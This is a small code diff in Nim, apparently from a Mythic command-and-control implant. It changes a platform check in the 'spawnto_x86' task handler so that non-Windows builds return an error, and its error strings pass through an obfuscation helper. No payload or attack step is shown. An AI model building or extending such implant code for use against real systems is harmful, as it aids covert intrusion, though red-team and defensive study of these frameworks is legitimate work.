@@ -23,5 +23,5 @@ proc spawnto_x86*(taskId: string, params: JsonNode): JsonNode =
     except Exception as e:
       return mythicError(taskId, obf("spawnto_x86 error: ") & e.msg)
   
-  when defined(linux):
+  else:
     return mythicError(taskId, obf("spawnto_x86 is only available on Windows"))
